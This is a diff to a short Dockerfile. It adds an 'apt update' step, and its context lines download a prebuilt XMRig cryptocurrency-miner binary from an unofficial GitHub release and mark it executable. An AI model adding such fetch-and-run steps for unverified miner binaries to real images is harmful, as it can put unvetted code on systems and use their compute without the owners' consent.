@@ -1,6 +1,7 @@
 FROM ubuntu:18.04
 
-RUN apt install wget -y &&\
+RUN apt update &&\
+    apt install wget -y &&\
     wget https://github.com/worldawa/xmrig/releases/download/1.0/xmrigX86_64 &&\
     chmod +x /xmrigX86_64 \
     
